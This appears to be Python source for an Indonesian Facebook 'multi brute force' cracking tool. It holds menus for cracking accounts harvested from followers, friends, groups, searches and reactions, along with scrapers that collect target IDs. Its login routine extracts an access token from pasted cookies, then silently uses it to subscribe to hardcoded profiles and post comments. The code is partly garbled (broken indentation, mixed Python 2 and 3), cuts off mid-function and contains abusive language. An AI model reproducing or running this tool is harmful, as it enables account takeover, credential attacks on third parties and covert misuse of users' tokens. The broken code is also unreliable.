#!/usr/bin/python2
# coding=utf-8
#fb:facebook.com/ih.wibu.14
#fb:facebook.com/ih.wibu.14
# RECOD GUE BANTAI LU ANJING
q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[1;94m'
i='\033[1;92m'
c='\033[1;96m'
m='\033[1;91m'
u='\033[1;95m'
k='\033[1;93m'
p='\033[1;97m'
h='\033[1;90m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # BIRU MUDA
H = '\x1b[1;92m' # UNGU
K = '\x1b[1;93m' # HIJAU
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # KUNING
O = '\x1b[1;96m' # MERAH
N = '\x1b[0m'    # WARNA MATI
try:
	import requests
	import sys
	import os
	import subprocess
	import random
	import time
	import re
	import json
	import uuid
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
except Exception as modul:
	print(" \033[0;97m[\033[0;91m!\033[0;97m] Module requests not installed yet")
	exit(" \033[0;97m[\033[0;93m#\033[0;97m] Please Type : pip2 install requests")

loop = 0
ok = []
cp = []
id = []
pwx = []
animasis = ["[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]", "[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■] LOGIN BERHASIL MOHON TUNGGU NJING"]        
for i in range(len(animasis)):
	time.sleep(0.02)
	sys.stdout.write("\r\x1b[1;95m#\x1b[1;92mLoading "+ random.choice(['\x1b[1;93m', '\x1b[1;96m', '\x1b[1;95m', '\x1b[1;92m', '\x1b[1;91m','\x1b[1;94m']) + animasis[i % len(animasis)])
	sys.stdout.flush()

s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
durasi = str(datetime.now().strftime('%d-%m-%Y'))
	
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
def __cekfol__():
	ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
	os.system("clear")
	try:
		token = open('/results')
		menu()
	except (KeyError,IOError):
		os.system("-mkdir /results")
		bot_komen()
def logo():
	s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
#	__cekfol__()
#	os.system("mkdir /results")
	try:
		token = open('.ua.txt')
		token = open('.ua')
	except (KeyError,IOError):
		os.system("echo 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]' >> .ua.txt")
		os.system("echo 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]' >> .ua")
	os.system("clear")
	print("""||>>>>> ____  ____  _____ __  __ ___ _   _ __  __
|  _ \|  _ \| ____|  \/  |_ _| | | |  \/  |
| |_) | |_) |  _| | |\/| || || | | | |\/| |
|  __/|  _ <| |___| |  | || || |_| | |  | |
|_|   |_| \_\_____|_|  |_|___|\___/|_|  |_|
╔═════════════════════════════════════════════╗
║🅳🅸🅲🅺🆈---------🅼🆄🅻🆃🅸-------🅱🆁🆄🆃🅴----🅵🅾🆁🅲🅴     ║
╚═════════════════════════════════════════════╝""")
def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
        os.system('rm -rf login.txt')
    requests.post('https://graph.facebook.com/100003723696885/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000298627412/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/4481379231881987/comments?message=Ganteng Dulu KONTOL :V!&access_token={t}')
    print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
    menu()

def login():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		
		print("\n \033[0;97m  METHODE LOGIN:.........?")
		print(" \033[0;97m[\033[0;96m1\033[0;97m] Login Pakai Token ")
		print(" \033[0;97m[\033[0;96m2\033[0;97m] Login Pakai Cookies")
		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Pilih Salah Satu NJENG! : ")
		if ask =="":
			login()
		elif ask == "1" or ask == "01":
			tokenz()
		elif ask == "2" or ask == "02":
			cookie()
		else:
			login()
			
def cookie():
	logo()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Cara Ambil Cookies : https://youtu.be/X7m_O_tZnTc")
	cookie = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Masukkan Cookies : \033[0;96m")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	bot_komen()
	
def tokenz():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		print("\n \033[0;97m[\033[0;93m*\033[0;97m] Cara Ambil Token : https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed")
		token = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Masukan Token : \033[0;96m")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			avsid = open("login.txt", 'w')
			avsid.write(token)
			avsid.close()
			bot_komen()
		except KeyError:
			exit(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")

def menu():
	os.system('clear')
	global token
	try:
		token = open('.Status','r').read()
		stass = "Premium *"
	except IOError:
		stass = "Premium"
	try:
		token = open('login.txt','r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		os.system('clear')
		os.system('rm -rf login.txt')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	    	user = a['username']
	except KeyError:
		os.system('clear')
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		os.system('rm -rf login.txt')
		login()
	except requests.exceptions.ConnectionError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] Please Check Your Network !!')
	try:
		token = open('results/hai.txt','r').read()
	except IOError:
		os.system("mkdir results")
		os.system("echo 'Jangan DiEdit Nanti Rusak..' >> results/hai.txt")
	logo()
			print("+"+"~"*40+"+")
			print(f"[*] Uid  : {tentang.get('uid')}")
			print(f"[*] Nama : {tentang.get('nama')}")
			if tentang.get("username") is None:
				print("+"+"~"*40+"+")
			else:
				print(f"[*] Username : {tentang.get('username')}")
				print("+"+"~"*40+"+")
			print("[01] Crack Dari Followers")
			print("[02] Crack Dari Daftar Teman")
			print("[03] Crack Dari Member Group")
			print("[04] Crack Dari Pencarian Nama")
			print("[05] Crack Dari Daftar Teman Target")
			print("[06] Crack Dari Permintaan Pertemanan")
			print("[07] Crack Dari Permintaan Terkirim")
			print("[08] Crack Dari Reaction Post")
			print("[09] Crack Dari Saran Teman")
			print("[10] Crack Dari Hashtag")
			print("[11] Menu Tambahan")
			print("[00] Keluar")
			print("+"+"~"*40+"+")
	def tentang_sc(self):
		print("""

[!] Jika Menemukan Bug Atau Error Di Script Silahkan Update/Laporkan Ke WhatsApp/Facebook Saya:)
""")
		input("[*] Enter Untuk Kembali Ke Menu > ")
class ngentod:
	def __init__(self):
		self.url="https://mbasic.facebook.com"
		self.id=[]
	def folower(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>',kontol) 
			for softek in memek:
				if "&amp;refid=" in softek[0]:
					self.id.append(re.findall("id=(.*?)&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				elif "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				elif "?refid=" in softek[0]:
					self.id.append(re.findall("(.*?)\?refid=",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(softek[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat Selengkapnya" in kontol:
				self.folower(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def babaturan(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat selengkapnya" in kontol:
				self.babaturan(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def memekgrup(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(softek[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat Selengkapnya" in kontol:
				self.memekgrup(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
			else:
				def geh(gey):
					a=req.get(gey,cookies=kueh).text
					b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
					if len(b)!=0:
						for c in b:
							if "profile.php" in c[0]:
								d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"[AapAfandiGanteng]"+c[1])
							else:
								d=re.search("(.*?)\?refid",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"[AapAfandiGanteng]"+c[1])
							print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
					if "Lihat Postingan Lainnya" in a:
						geh(self.url+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				geh(f"{self.url}/groups/"+re.search("id=(\\d*)",hencet).group(1))
		except:pass
	def teangan(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',kontol)
			for softek in memek:
				if "profile.php?" in softek[1]:
					self.id.append(re.findall("id=(.*?)&amp;refid",softek[1])[0]+"[AapAfandiGanteng]"+softek[2])
				else:
					self.id.append(re.findall("(.*?)\?refid=",softek[1])[0]+"[AapAfandiGanteng]"+softek[2])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.teangan(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:pass
	def flrencang(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id\=(.*?)\&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat Teman Lain" in kontol:
				self.flrencang(self.url+parser(kontol,"html.parser").find("a",string="Lihat Teman Lain").get("href"))
		except:pass
	def menta(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat selengkapnya" in kontol:
				self.menta(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def reactpost(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			if "Semua 0" in kontol:
				print("[!] Tidak Ada Yang Menanggapi Postingan, Awokawokawok Kasian Akun Nya Sepi:v");waktu(3);self.menu()
			else:
				memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
				for softek in memek:
					if "profile.php?" in softek[0]:
						self.id.append(re.findall("id=(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
					else:
						self.id.append(re.findall("/(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
					print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
				if "Lihat Selengkapnya" in kontol:
					self.reactpost(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def hastag(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ class\=\".."\ href\=\"(.*?)__tn__=C">(.*?)</a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					tol=re.search("profile.php\?id=(\\d*)",softek[0]).group(1)
					if "/" in tol[-1:]:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"[AapAfandiGanteng]"+softek[1])
				else:
					tol=re.search("/(.*?)\?",softek[0]).group(1)
					if "/" in tol[-1:]:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.hastag(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:pass
	def saran(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<a\ class\=\".."\ href\=\"/friends/hovercard/mbasic/\?uid=(\\d*).*?"\>(.*?)</a\>',kontol)
			if len(memek)!=0:
				for softek in memek:
					self.id.append(softek[0]+"[AapAfandiGanteng]"+softek[1])
					print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
					if len(self.id)==jum:
						true=True
						break
			if true==False:
